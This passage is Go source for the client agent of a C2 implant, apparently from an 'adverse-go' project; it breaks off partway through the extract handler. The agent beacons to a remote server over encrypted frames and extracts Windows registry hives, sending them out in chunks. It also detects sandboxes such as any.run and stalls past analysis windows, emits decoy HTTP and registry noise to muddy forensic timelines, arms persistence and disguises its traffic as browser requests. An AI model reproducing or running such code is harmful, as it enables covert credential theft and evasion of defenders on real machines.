package agent

import (
	"bytes"
	"context"
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"sync"
	"syscall"
	"time"

	"github.com/ashwnn/adverse-go/internal/antiforensic"
	"github.com/ashwnn/adverse-go/internal/audit"
	"github.com/ashwnn/adverse-go/internal/behavioural"
	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/drop"
	"github.com/ashwnn/adverse-go/internal/hygiene"
	"github.com/ashwnn/adverse-go/internal/message"
	"github.com/ashwnn/adverse-go/internal/netshape"
	"github.com/ashwnn/adverse-go/internal/opsec"
	"github.com/ashwnn/adverse-go/internal/persist"
	"github.com/ashwnn/adverse-go/internal/registrywin"
	"github.com/ashwnn/adverse-go/internal/spool"
	"github.com/ashwnn/adverse-go/internal/timerwait"
	"github.com/ashwnn/adverse-go/internal/wire"
)

// MaxResponseBytes caps the maximum response body size to prevent OOM.
const MaxResponseBytes = 2 * 1024 * 1024 // 2 MB

// Agent implements the ADVERSE C2 client lifecycle.
type Agent struct {
	cfg     *Config
	logger  *log.Logger
	dryRun  bool
	verbose bool

	// Crypto state
	secret32     [32]byte
	signPub      ed25519.PublicKey
	bootstrapKey [32]byte
	serverPriv   *ecdh.PrivateKey
	serverPub    [32]byte
	ephPriv      *ecdh.PrivateKey
	ephPub       [32]byte
	sessionKey   [32]byte // forward-secret session key (ephemeral ECDH)
	prefix       [3]byte  // session frame prefix (FS key)
	salt         [16]byte

	// Wire state
	sendSeq uint32
	recvSeq uint32
	rw      *wire.ReplayWindow

	// HTTP
	httpClient *http.Client

	// Dead-drop transport (transport.mode = "drop"); nil in https mode.
	dropClient *drop.Client

	// State
	state         *StateFile
	lastKillEpoch uint64

	// processedJobs remembers terminal job IDs so a re-dispatched task (ack
	// lost, server retry) is not executed twice. Bounded with FIFO eviction.
	processedJobs *jobSet
	// extractProgress records the next chunk seq to send per in-flight extract
	// job so a re-dispatch resumes the chunk loop instead of no-op'ing.
	extractProgress *jobProgress

	// postFrameHook is a test-only seam: when non-nil it replaces the
	// network/dry-run transport in postFrame. Production leaves it nil, so the
	// real network path is unchanged.
	postFrameHook func(ctx context.Context, frame []byte, seq uint32) ([]byte, error)

	// extractChunksHook is a test-only seam replacing registrywin extraction
	// (real-mode extraction is Windows-only). Production leaves it nil.
	extractChunksHook func(hives []string, chunkSize int) ([]*registrywin.Chunk, error)

	// Durable encrypted spool. nil when disabled or when Open degraded on a
	// non-real-mode run; every use is nil-guarded.
	spool *spool.Store

	// persistence is the armed persistence manager (nil until armPersistence
	// runs). persistFactory is a test seam defaulting to persist.New.
	persistence    persist.Manager
	persistFactory func(persist.Config) (persist.Manager, error)

	// shaper shapes HTTPS request headers and paths when shaping.enabled.
	shaper *netshape.Profile

	// teardownStateRemoval requests deletion of the signed-kill replay-floor
	// state file. It is set only on intentional stops (delivery complete,
	// accepted kill, TTL/ctx cancellation), never on fatal exit so a watchdog
	// relaunch keeps the replay floor.
	teardownStateRemoval bool

	// cleanupOnce makes final teardown idempotent across the deferred and the
	// explicit (delivery-complete/accepted-kill) call sites.
	cleanupOnce sync.Once

	// serverCompleted tracks extract jobs the server has confirmed complete.
	serverCompleted *jobSet

	// Beacon timing
	beaconInterval int
	beaconJitter   int

	// jitterRNG drives beacon/chunk timing. Deterministic when the config sets
	// transport.jitter_seed (CI/tests), otherwise crypto-seeded once at start.
	jitterRNG *mrand.Rand
}

// newJitterRNG builds the timing RNG from the config seed (hex, optional).
func newJitterRNG(seedHex string) (*mrand.Rand, error) {
	if seedHex == "" {
		var b [8]byte
		if _, err := rand.Read(b[:]); err != nil {
			return nil, err
		}
		return mrand.New(mrand.NewSource(int64(binary.LittleEndian.Uint64(b[:])))), nil
	}
	seedBytes, err := hex.DecodeString(seedHex)
	if err != nil || len(seedBytes) < 8 {
		return nil, fmt.Errorf("transport.jitter_seed must be >= 8 hex chars")
	}
	return mrand.New(mrand.NewSource(int64(binary.LittleEndian.Uint64(seedBytes[:8])))), nil
}

// New creates a new Agent with the given config.
func New(cfg *Config, logger *log.Logger, dryRun, verbose bool) (*Agent, error) {
	if logger == nil {
		logger = log.New(os.Stderr, "[agent] ", log.LstdFlags)
	}

	secret32, err := cryptokeys.Secret32(cfg.Secret)
	if err != nil {
		return nil, fmt.Errorf("derive secret: %w", err)
	}

	signPubBytes, err := hex.DecodeString(cfg.SignPubHex)
	if err != nil || len(signPubBytes) != ed25519.PublicKeySize {
		return nil, fmt.Errorf("invalid sign_pub_hex")
	}

	bk, err := cryptokeys.BootstrapKey(secret32)
	if err != nil {
		return nil, fmt.Errorf("derive bootstrap key: %w", err)
	}

	sp, err := cryptokeys.DeriveServerKey(secret32)
	if err != nil {
		return nil, fmt.Errorf("derive server key: %w", err)
	}
	spub, err := cryptokeys.ServerPublicBytes(sp)
	if err != nil {
		return nil, fmt.Errorf("server public bytes: %w", err)
	}

	ep, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate ephemeral key: %w", err)
	}
	var epub [32]byte
	copy(epub[:], ep.PublicKey().Bytes())

	var salt [16]byte
	if _, err := rand.Read(salt[:]); err != nil {
		return nil, fmt.Errorf("generate salt: %w", err)
	}

	// Load the persisted kill epoch from the state file if present.
	// Prefer the config's directory; fallback to cwd for backwards compat.
	statePath := ".agent_state.json"
	if cfg.ConfigPath != "" {
		statePath = filepath.Join(filepath.Dir(cfg.ConfigPath), ".agent_state.json")
	}
	state := &StateFile{path: statePath}
	if data, err := os.ReadFile(state.path); err == nil {
		_ = json.Unmarshal(data, state)
	} else if cfg.ConfigPath != "" && statePath != ".agent_state.json" {
		// Legacy cwd fallback
		if data2, err2 := os.ReadFile(".agent_state.json"); err2 == nil {
			_ = json.Unmarshal(data2, state)
			// Keep original path for Save() consistency, but prefer config-dir path for future saves.
			state.path = statePath
		}
	}

	userAgent := cfg.UserAgent
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
	}
	tlsConfig := &tls.Config{MinVersion: tls.VersionTLS12}
	if cfg.TLSSkipVerify {
		tlsConfig.InsecureSkipVerify = true
	}
	hc := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   tlsConfig,
			MaxIdleConns:      10,
			IdleConnTimeout:   30 * time.Second,
			DisableKeepAlives: false,
		},
	}

	// Build the transport: HTTPS client or dead-drop store.
	var dropClient *drop.Client
	switch cfg.TransportMode() {
	case "drop":
		var store drop.Store
		dc := cfg.Transport.Drop
		switch dc.Store {
		case "http":
			hs := drop.NewHTTPStore(dc.BaseURL)
			hs.Username = dc.Auth.Username
			hs.Password = dc.Auth.Password
			hs.BearerEnv = dc.Auth.BearerEnv
			if dc.Auth.Type == "bearer" && dc.Auth.BearerEnv == "" && dc.Auth.Username == "" {
				// bearer with inline token unsupported on agent config (avoid secrets in files);
				// require env reference.
				return nil, fmt.Errorf("transport.drop.auth.type bearer requires auth.bearer_env")
			}
			store = hs
		case "graph":
			gs := drop.NewGraphStore(dc.TenantID, dc.ClientID, dc.ClientSecret, dc.UserUPN)
			gs.ClientSecretEnv = dc.ClientSecretEnv
			store = gs
		default:
			return nil, fmt.Errorf("unknown drop store %q", dc.Store)
		}
		pollS := dc.PollIntervalS
		if pollS <= 0 {
			pollS = 2
		}
		timeoutS := dc.ResponseTimeoutS
		if timeoutS <= 0 {
			timeoutS = 120
		}
		dropClient = drop.NewClient(store, dc.Dir, cfg.AgentID)
		dropClient.PollInterval = time.Duration(pollS) * time.Second
		dropClient.ResponseTimeout = time.Duration(timeoutS) * time.Second
	}

	// Jitter RNG: deterministic under transport.jitter_seed for reproducible
	// tests, otherwise crypto-seeded.
	rng, err := newJitterRNG(cfg.Transport.JitterSeed)
	if err != nil {
		return nil, err
	}

	// Traffic shaping: one browser-like Profile per process session. The seed
	// follows transport.jitter_seed when present so tests stay deterministic,
	// otherwise NewProfile draws crypto-random entropy.
	var shaper *netshape.Profile
	if cfg.Shaping.Enabled {
		basePath := ""
		if u, err := url.Parse(cfg.ServerURL); err == nil {
			basePath = u.Path
		}
		shaper = netshape.NewProfile(basePath, shapingSeed(cfg.Transport.JitterSeed))
	}

	// Decoy HTTP is inert unless ADVERSE_DECOY_HTTP=1 (see behavioural).
	return &Agent{
		cfg:             cfg,
		logger:          logger,
		dryRun:          dryRun,
		verbose:         verbose,
		secret32:        secret32,
		signPub:         signPubBytes,
		bootstrapKey:    bk,
		serverPriv:      sp,
		serverPub:       spub,
		ephPriv:         ep,
		ephPub:          epub,
		salt:            salt,
		rw:              wire.NewReplayWindow(wire.DefaultReplayWindowSize),
		httpClient:      hc,
		dropClient:      dropClient,
		state:           state,
		lastKillEpoch:   state.LastAcceptedEpoch,
		processedJobs:   newJobSet(maxTrackedJobs),
		extractProgress: newJobProgress(maxTrackedJobs),
		serverCompleted: newJobSet(maxTrackedJobs),
		persistFactory:  persist.New,
		shaper:          shaper,
		beaconInterval:  30,
		beaconJitter:    5,
		jitterRNG:       rng,
	}, nil
}

// shapingSeed decodes the optional hex jitter seed for netshape. A malformed
// or empty seed yields nil, which makes the profile draw crypto-random entropy.
func shapingSeed(seedHex string) []byte {
	if seedHex == "" {
		return nil
	}
	b, err := hex.DecodeString(seedHex)
	if err != nil || len(b) == 0 {
		return nil
	}
	return b
}

// Run executes the full agent lifecycle.
// Returns exit code: 0=kill, 2=kill_switch, 1=fatal. A context cancellation
// (signal or caller cancellation) normalizes to 0 so the persistence watchdog
// treats it as an intentional stop.
func (a *Agent) Run(ctx context.Context) int {
	// Execution hygiene BEFORE any network work: suppress blocking error
	// dialogs and hide the console window (Windows; no-op elsewhere).
	hygiene.Apply()

	killCtx, killCancel := context.WithCancel(ctx)
	defer killCancel()

	// Single teardown for every exit path: disarm persistence, wipe the
	// spool, optionally scrub traces; the state file is removed only when the
	// run ends intentionally (the flag is read at defer execution time).
	defer func() { a.finalCleanup(a.teardownStateRemoval) }()

	// Open the spool before any network activity. In real_mode an open failure
	// is fatal (fail closed); in synthetic/dry-run it degrades to today's
	// in-memory behavior.
	if a.cfg.Spool.Enabled {
		dir := a.cfg.Spool.Dir
		if dir == "" {
			dir = spool.DefaultDir(a.cfg.AgentID)
		}
		st, err := spool.Open(dir, a.secret32[:], a.cfg.AgentID)
		if err != nil {
			if a.cfg.RealMode {
				a.logger.Printf("spool open failed in real_mode (fail-closed): %v", err)
				return 1
			}
			a.logger.Printf("spool open failed; continuing without durable spool: %v", err)
		} else {
			a.spool = st
		}
	}

	// Signal handling integrates with kill-switch context
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		killCancel()
	}()

	if a.verbose {
		coverage := opsec.Coverage(&opsec.Config{
			SyntheticOnly:  !a.cfg.RealMode,
			DirectSyscalls: true,
		})
		a.logger.Println("Sensor Coverage Matrix:")
		a.logger.Println(coverage.Render())
	}

	// Behavioural gate (any.run / sandbox). Env-keyed: only arms staged work
	// on a real interactive desktop; sandboxes stay in benign beacon loop.
	// Disabled with ADVERSE_BEHAVIOURAL=0 (e.g., CI). Enabled by default on
	// Windows 10/11 hardened builds.
	if os.Getenv("ADVERSE_BEHAVIOURAL") != "0" {
		gate := behavioural.Allow(killCtx)
		if !gate.Allowed {
			a.logger.Printf("behavioural gate: sandbox signals %v — staying benign, stalling past analysis window", gate.Reasons)
			behavioural.MimicBenignRegistryNoise()
			// Stall 120s (beyond any.run 60-90s) but respect killCtx
			behavioural.StallBeyondSandbox(killCtx, 120)
			// Remain in benign beacon loop (no NtSaveKey) — return to beaconLoop which will handle tasks benignly
			if a.verbose {
				a.logger.Println("behavioural signals:", gate.Signals)
			}
		} else {
			// Real desktop: pollute timeline with benign noise and decoy HTTP before any sensitive call
			behavioural.MimicBenignRegistryNoise()
			if !a.dryRun {
				behavioural.MimicDecoyHTTP(killCtx)
			}
		}
		if a.verbose && len(gate.Reasons) > 0 {
			a.logger.Printf("behavioural gate reasons: %v", gate.Reasons)
		}
		// Environmental key binds future trampoline decrypts to host; it is
		// consumed inside syscalls.executeSyscall via ArmEncryptedTrampoline so
		// staged stubs are invisible until decrypted on the real host.
		envKey := behavioural.EnvironmentalKey()
		if a.verbose {
			a.logger.Printf("environmental key derived (%x...)", envKey[:4])
		}
		_ = envKey
	}

	// Phase 1: Hello handshake
	if err := a.hello(killCtx); err != nil {
		a.logger.Printf("Hello failed: %v (retrying...)", err)
		if !a.retryWithBackoff(killCtx, func() error { return a.hello(killCtx) }) {
			if killCtx.Err() != nil {
				a.logger.Printf("Hello aborted: kill-switch context cancelled (intentional stop)")
				a.teardownStateRemoval = true
				return 0
			}
			return 1
		}
	}

	// Phase 2: Beacon loop
	return a.beaconLoop(killCtx)
}

// hello performs the initial handshake with the server.
func (a *Agent) hello(ctx context.Context) error {
	sid := make([]byte, 8)
	rand.Read(sid)

	payload := fmt.Sprintf(`{"agent_id":"%s","sid":"%s","eph_pub":"%s","salt":"%s"}`,
		a.cfg.AgentID, hex.EncodeToString(sid), hex.EncodeToString(a.ephPub[:]), hex.EncodeToString(a.salt[:]))

	msg := message.Make("hello", a.cfg.AgentID, "hello-0", payload, float64(time.Now().UnixNano())/1e9)
	msgJSON, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal hello: %w", err)
	}

	frame, err := wire.Build(msgJSON, a.bootstrapKey[:], []byte(wire.LegacyMagic), nil, 0, wire.DirectionClientToServer)
	if err != nil {
		return fmt.Errorf("build hello frame: %w", err)
	}

	// Derive the handshake key and prefix BEFORE parsing the hello response:
	// the server encrypts the hello ack with the static-ECDH handshake key
	// (which authenticates the server), not the bootstrap key.
	hsKey, err := cryptokeys.HandshakeKey(a.ephPriv, a.serverPub, a.salt, a.cfg.AgentID)
	if err != nil {
		return fmt.Errorf("derive handshake key: %w", err)
	}
	hsPrefix, err := cryptokeys.FramePrefix(hsKey, "v2")
	if err != nil {
		return fmt.Errorf("derive handshake prefix: %w", err)
	}

	resp, err := a.postFrame(ctx, frame, 0)
	if err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	// Server->client uses agent_id+":in" as AAD for the hello ack.
	aadIn := []byte(a.cfg.AgentID + ":in")
	plain, _, _, err := wire.Parse(resp, hsKey[:], hsPrefix[:], aadIn, wire.DirectionServerToClient)
	if err != nil {
		return fmt.Errorf("parse hello response: %w", err)
	}

	// Extract the server's per-session ephemeral public key and derive the
	// forward-secret session key used for all subsequent traffic.
	var ack struct {
		Payload string `json:"payload"`
	}
	if err := json.Unmarshal(plain, &ack); err != nil {
		return fmt.Errorf("decode hello ack: %w", err)
	}
	var ackPayload struct {
		ServerEphPub string `json:"server_eph_pub"`
		Interval     int    `json:"interval"`
		Jitter       int    `json:"jitter"`
	}
	if err := json.Unmarshal([]byte(ack.Payload), &ackPayload); err != nil {
		return fmt.Errorf("decode hello ack payload: %w", err)
	}
	if ackPayload.ServerEphPub == "" {
		return fmt.Errorf("hello ack missing server_eph_pub (forward secrecy required)")
	}
	ephPubBytes, err := hex.DecodeString(ackPayload.ServerEphPub)
	if err != nil || len(ephPubBytes) != 32 {
		return fmt.Errorf("hello ack server_eph_pub invalid: %w", err)
	}
	var serverEphPub [32]byte
	copy(serverEphPub[:], ephPubBytes)

	// Apply server-directed beacon timing from the hello-ack.
	if ackPayload.Interval > 0 {
		a.beaconInterval = ackPayload.Interval
	}
	if ackPayload.Jitter >= 0 {
		a.beaconJitter = ackPayload.Jitter
	}

	sk, err := cryptokeys.SessionKey(a.ephPriv, serverEphPub, a.salt, a.cfg.AgentID)
	if err != nil {
		return fmt.Errorf("derive forward-secret session key: %w", err)
	}
	a.sessionKey = sk

	pfx, err := cryptokeys.FramePrefix(sk, "v2")
	if err != nil {
		return fmt.Errorf("derive frame prefix: %w", err)
	}
	a.prefix = pfx

	a.logger.Printf("Hello complete, forward-secret session established")
	return nil
}

// beaconLoop runs the main beacon/task loop.
func (a *Agent) beaconLoop(ctx context.Context) int {
	for {
		select {
		case <-ctx.Done():
			a.logger.Printf("Context cancelled (intentional stop)")
			a.teardownStateRemoval = true
			return 0
		default:
		}

		// Build beacon
		msg := message.Make("beacon", a.cfg.AgentID, "beacon-0", "", float64(time.Now().UnixNano())/1e9)
		msgJSON, err := json.Marshal(msg)
		if err != nil {
			a.logger.Printf("marshal beacon: %v", err)
			continue
		}

		pfxBytes := a.prefix[:]
		aadOut := []byte(a.cfg.AgentID + ":out")
		aadIn := []byte(a.cfg.AgentID + ":in")

		frame, err := wire.Build(msgJSON, a.sessionKey[:], pfxBytes, aadOut, a.sendSeq, wire.DirectionClientToServer)
		if err != nil {
			a.logger.Printf("build beacon frame: %v", err)
			continue
		}
		a.sendSeq++

		resp, err := a.postFrame(ctx, frame, a.sendSeq-1)
		if err != nil {
			a.logger.Printf("beacon failed: %v", err)
			if !a.retryWithBackoff(ctx, func() error {
				_, e := a.postFrame(ctx, frame, a.sendSeq-1)
				return e
			}) {
				if ctx.Err() != nil {
					a.logger.Printf("beacon retry aborted: kill-switch context cancelled (intentional stop)")
					a.teardownStateRemoval = true
					return 0
				}
				return 1
			}
			continue
		}

		plain, seq, ok, err := wire.Parse(resp, a.sessionKey[:], pfxBytes, aadIn, wire.DirectionServerToClient)
		if err != nil {
			a.logger.Printf("parse response: %v", err)
			continue
		}
		if !ok {
			continue
		}
		if !a.rw.Check(seq) {
			a.logger.Printf("replay detected (seq=%d)", seq)
			continue
		}
		a.rw.Record(seq)
		a.recvSeq++

		var respMsg map[string]any
		if err := json.Unmarshal(plain, &respMsg); err != nil {
			a.logger.Printf("unmarshal response: %v", err)
			continue
		}

		msgType, _ := respMsg["type"].(string)
		switch msgType {
		case "task":
			taskID, _ := respMsg["task_id"].(string)
			// Confirm receipt so the server advances the task lifecycle; the
			// task still runs if the ack is lost (the server retries and the
			// agent's processedJobs set deduplicates execution).
			a.ackTask(ctx, taskID)
			if a.handleTask(ctx, respMsg) == 2 {
				return 2
			}
		case "kill":
			code := a.handleKill(respMsg)
			if code >= 0 {
				return code
			}
		case "beacon":
			if a.updateBeaconInterval(ctx, respMsg) {
				return 0
			}
		default:
			if a.verbose {
				a.logger.Printf("unknown response type: %s", msgType)
			}
		}

		delay := a.beaconDelay()
		if !a.sleep(ctx, delay) {
			a.teardownStateRemoval = true
			return 0
		}
	}
}

// handleTask dispatches a task message by action. Returns 2 when the task
// triggered a kill_switch exit.
func (a *Agent) handleTask(ctx context.Context, msg map[string]any) int {
	payloadStr, _ := msg["payload"].(string)
	jobID, _ := msg["task_id"].(string)

	taskPayload := map[string]any{}
	if payloadStr != "" {
		if err := json.Unmarshal([]byte(payloadStr), &taskPayload); err != nil {
			a.logger.Printf("unmarshal task payload: %v", err)
			return 0
		}
	}
	if jid, ok := taskPayload["job_id"].(string); ok && jid != "" {
		jobID = jid
	}
	if jobID == "" {
		jobID = fmt.Sprintf("anon-%d", time.Now().UnixNano())
	}

	// Idempotency: a terminal job is never executed twice. An in-flight
	// extract job is not terminal: handleExtract resumes it from recorded
	// chunk progress when the server re-dispatches after a lost chunk.
	if a.processedJobs.has(jobID) {
		a.logger.Printf("Task %s already completed - skipping re-dispatch", jobID)
		return 0
	}

	action, _ := taskPayload["action"].(string)
	switch action {
	case "extract":
		return a.handleExtract(ctx, jobID, taskPayload)
	case "sleep":
		seconds := intFromMap(taskPayload, "seconds", 30)
		a.logger.Printf("Task sleep: job=%s seconds=%d", jobID, seconds)
		if !a.sleep(ctx, time.Duration(seconds)*time.Second) {
			return 0
		}
		if a.sendStatusResult(ctx, jobID, action, "ok", fmt.Sprintf("slept %ds", seconds)) {
			a.markProcessed(jobID)
		}
		return 0
	case "noop":
		a.logger.Printf("Task noop: job=%s", jobID)
		if a.sendStatusResult(ctx, jobID, action, "ok", "noop") {
			a.markProcessed(jobID)
		}
		return 0
	default:
		a.logger.Printf("Unknown task action %q for job %s", action, jobID)
		if a.sendStatusResult(ctx, jobID, action, "error", fmt.Sprintf("unknown action %q", action)) {
			a.markProcessed(jobID)
		}
		return 0
	}
}

// maxTrackedJobs bounds the terminal-job and extract-progress maps. Eviction
// is deterministic FIFO (oldest first), never random.
const maxTrackedJobs = 256

// jobSet is a bounded insertion-ordered set of job IDs.
type jobSet struct {
	items map[string]struct{}
	order []string
	max   int
}

func newJobSet(max int) *jobSet {
	return &jobSet{items: make(map[string]struct{}), max: max}
}

func (s *jobSet) has(jobID string) bool {
	_, ok := s.items[jobID]
	return ok
}

// len returns the number of tracked job IDs.
func (s *jobSet) len() int { return len(s.items) }

func (s *jobSet) add(jobID string) {
	if s.has(jobID) {
		return
	}
	if len(s.order) >= s.max {
		oldest := s.order[0]
		s.order = s.order[1:]
		delete(s.items, oldest)
	}
	s.items[jobID] = struct{}{}
	s.order = append(s.order, jobID)
}

// jobProgress tracks the next chunk seq to send per in-flight extract job.
type jobProgress struct {
	next  map[string]int
	order []string
	max   int
}

func newJobProgress(max int) *jobProgress {
	return &jobProgress{next: make(map[string]int), max: max}
}

func (p *jobProgress) get(jobID string) (int, bool) {
	next, ok := p.next[jobID]
	return next, ok
}

// empty reports whether no in-flight extract progress is tracked.
func (p *jobProgress) empty() bool { return len(p.next) == 0 }

func (p *jobProgress) set(jobID string, next int) {
	if _, ok := p.next[jobID]; ok {
		p.next[jobID] = next
		return
	}
	if len(p.order) >= p.max {
		oldest := p.order[0]
		p.order = p.order[1:]
		delete(p.next, oldest)
	}
	p.next[jobID] = next
	p.order = append(p.order, jobID)
}

func (p *jobProgress) delete(jobID string) {
	if _, ok := p.next[jobID]; !ok {
		return
	}
	delete(p.next, jobID)
	for i, id := range p.order {
		if id == jobID {
			p.order = append(p.order[:i], p.order[i+1:]...)
			break
		}
	}
}

// markProcessed records a job as terminally completed, returning true if it
// was already recorded. Recording a terminal job clears any in-flight extract
// progress for it. Both tracking structures are bounded to maxTrackedJobs.
func (a *Agent) markProcessed(jobID string) bool {
	if a.processedJobs.has(jobID) {
		return true
	}
	a.processedJobs.add(jobID)
	a.extractProgress.delete(jobID)
	return false
}

func intFromMap(m map[string]any, key string, def int) int {
	if f, ok := m[key].(float64); ok {
		return int(f)
	}
	return def
}

func stringSliceFromMap(m map[string]any, key string) []string {
	raw, ok := m[key].([]any)
	if !ok {
		return nil
	}
	out := make([]string, 0, len(raw))
	for _, v := range raw {
		if s, ok := v.(string); ok && s != "" {
			out = append(out, s)
		}
	}
	return out
}

// ackTask sends an ack message for a received task (best-effort). The server
// advances the task from dispatched to acked on receipt.
func (a *Agent) ackTask(ctx context.Context, taskID string) {
	msg := message.Make("ack", a.cfg.AgentID, taskID, "", float64(time.Now().UnixNano())/1e9)
	msgJSON, err := json.Marshal(msg)
	if err != nil {
		return
	}
	frame, err := wire.Build(msgJSON, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":out"), a.sendSeq, wire.DirectionClientToServer)
	if err != nil {
		a.logger.Printf("build ack frame: %v", err)
		return
	}
	a.sendSeq++
	resp, err := a.postFrame(ctx, frame, a.sendSeq-1)
	if err != nil {
		a.logger.Printf("ack send failed (task %s): %v", taskID, err)
		return
	}
	if _, seq, ok, err := wire.Parse(resp, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":in"), wire.DirectionServerToClient); err == nil && ok {
		a.rw.Record(seq)
		a.recvSeq++
	}
	a.logger.Printf("Acked task %s", taskID)
}

// sendStatusResult reports a non-extract task's terminal status so the server
// can complete the task lifecycle entry. It returns true once the status
// message has been sent (the server completes the task on receipt).
func (a *Agent) sendStatusResult(ctx context.Context, jobID, action, status, detail string) bool {
	payload := map[string]any{
		"job_id": jobID,
		"action": action,
		"status": status,
		"detail": detail,
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		return false
	}
	msg := message.Make("result", a.cfg.AgentID, jobID, string(raw), float64(time.Now().UnixNano())/1e9)
	msgJSON, err := json.Marshal(msg)
	if err != nil {
		return false
	}
	frame, err := wire.Build(msgJSON, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":out"), a.sendSeq, wire.DirectionClientToServer)
	if err != nil {
		a.logger.Printf("build status frame: %v", err)
		return false
	}
	a.sendSeq++
	resp, err := a.postFrame(ctx, frame, a.sendSeq-1)
	if err != nil {
		a.logger.Printf("status send failed (task %s): %v", jobID, err)
		return false
	}
	if _, seq, ok, err := wire.Parse(resp, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":in"), wire.DirectionServerToClient); err == nil && ok {
		a.rw.Record(seq)
		a.recvSeq++
	}
	a.logger.Printf("Reported %s status=%s (task %s)", action, status, jobID)
	return true
}

// handleExtract runs the hive extraction task. Returns 2 on kill_switch.
//
// Re-dispatch safety: a failed chunk send/ack stops the loop at that seq and
// records progress for the job. A re-dispatched job resumes from that seq
// (the server reassembler deduplicates by seq, so re-sending is safe). The
// job is only marked terminal once every chunk has been sent and acked.
func (a *Agent) handleExtract(ctx context.Context, jobID string, taskPayload map[string]any) int {
	hives := stringSliceFromMap(taskPayload, "hives")
	if len(hives) == 0 {
		hives = a.cfg.Hives
	}
	// Task-supplied chunk_size is untrusted. Values above the 512 KB frame
	// bound are rejected (fail-closed) rather than clamped so an oversized
	// request cannot produce multi-MB frames and the operator sees the error.
	const maxChunkSize = 512 * 1024
	chunkSize := intFromMap(taskPayload, "chunk_size", 0)
	if chunkSize <= 0 {
		chunkSize = a.cfg.ChunkSize
	}
	if chunkSize > maxChunkSize {
		errMsg := fmt.Sprintf("chunk_size %d exceeds maximum %d", chunkSize, maxChunkSize)
		a.logger.Printf("Task extract rejected: %s (job %s)", errMsg, jobID)
		if a.sendStatusResult(ctx, jobID, "extract", "error", errMsg) {
			a.markProcessed(jobID)
		}
		return 0
	}

	a.logger.Printf("Task extract: job=%s hives=%v chunk_size=%d", jobID, hives, chunkSize)

	// any.run behavioural staging: on sandboxes this extract is time-shifted
	// and env-keyed. Gate re-checked per-task (any.run may not have sandbox
	// signals at boot but will after first beacon). Real desktop: delayed APC
	// simulation via env-aware stall; sandbox: benign fallback.
	if os.Getenv("ADVERSE_BEHAVIOURAL") != "0" {
		gate := behavioural.Allow(ctx)
		if !gate.Allowed {
			a.logger.Printf("behavioural gate: task %s suppressed in sandbox (reasons %v) — beaconing instead", jobID, gate.Reasons)
			return 0
		}
		// Real desktop: pollute network timeline with decoy HTTP before any
		// sensitive registry operation (dry-run guarantees no egress).
		if !a.dryRun {
			behavioural.MimicDecoyHTTP(ctx)
		}
		// Staged delay beyond any.run window when ADVERSE_BEHAVIOURAL_STAGING=1
		// (Windows hardened any.run evasion). Uses WaitableTimer+APC on Windows.
		if os.Getenv("ADVERSE_BEHAVIOURAL_STAGING") == "1" {
			a.logger.Printf("behavioural staging: delaying extract %s past analysis window (APC)", jobID)
			done := make(chan struct{})
			behavioural.DelayedWork(ctx, 115, func() { close(done) })
			// DelayedWork stalls the caller via StallBeyondSandbox; wait for ctx or done.
			select {
			case <-ctx.Done():
				return 0
			case <-done:
			}
		} else {
			// Short benign delay + noise to pollute timeline even on real host
			behavioural.MimicBenignRegistryNoise()
		}
	}

	// Durable image selection. A fully spooled job (every non-acked seq on
	// disk) is authoritative: extraction is non-deterministic across runs, so
	// already-spooled bytes are reused and never mixed with a fresh
	// extraction. A partial spool can only come from a crash during the
	// pre-send Put pass (no chunk was sent yet), so it is discarded and
	// rebuilt from this extraction.
	useSpool := false
	acked := map[int]bool{}
	imageHive := ""
	total := 0
	if a.spool != nil {
		if p, err := a.spool.Progress(jobID); err == nil && p.Total > 0 {
			for _, s := range p.Acked {
				acked[s] = true
			}
			if a.spoolCoversJob(jobID, p, acked) {
				useSpool = true
				imageHive = p.Hive
				total = p.Total
				a.logger.Printf("Task extract: job=%s fully spooled (%d chunks) — resuming without re-extraction", jobID, p.Total)
			} else {
				a.logger.Printf("Task extract: job=%s partial spool (crash before first send) — rebuilding", jobID)
				if err := a.spool.Complete(jobID); err != nil {
					a.logger.Printf("spool complete (rebuild) failed: %v", err)
				}
			}
		}
	}

	var chunks []*registrywin.Chunk
	var err error
	if !useSpool {
		if a.extractChunksHook != nil {
			chunks, err = a.extractChunksHook(hives, chunkSize)
		} else {
			extractor := registrywin.NewExtractor(registrywin.ExtractorConfig{
				Hives:     hives,
				ChunkSize: chunkSize,
				RealMode:  a.cfg.RealMode,
			}, "")
			chunks, err = extractor.ExtractChunks(hives, chunkSize)
		}
		if err != nil {
			a.logger.Printf("extract: %v", err)
			if a.sendStatusResult(ctx, jobID, "extract", "error", err.Error()) {
				a.markProcessed(jobID)
			}
			return 0
		}
		total = len(chunks)
	}

	// Arm persistence once extraction has succeeded (or the durable image is
	// authoritative) and before any chunk bytes leave the host (real_mode
	// only; no-op otherwise).
	if err := a.armPersistence(); err != nil {
		a.logger.Printf("persistence arm failed (continuing): %v", err)
	}

	// Materialize raw chunk bytes and spool the whole image BEFORE the first
	// send. If a chunk is ever sent, the complete image is already durable.
	var raws [][]byte
	if !useSpool {
		raws = make([][]byte, total)
		for i, c := range chunks {
			raws[i] = c.Serialize()
		}
		if a.spool != nil {
			for i, raw := range raws {
				if err := a.spool.Put(jobID, chunks[i].HiveName, i, total, raw); err != nil {
					a.logger.Printf("spool put %s[%d] failed (continuing in-memory): %v", jobID, i, err)
				}
			}
		}
	}
	defer func() {
		for _, raw := range raws {
			audit.SecureZeroBytes(raw)
		}
	}()

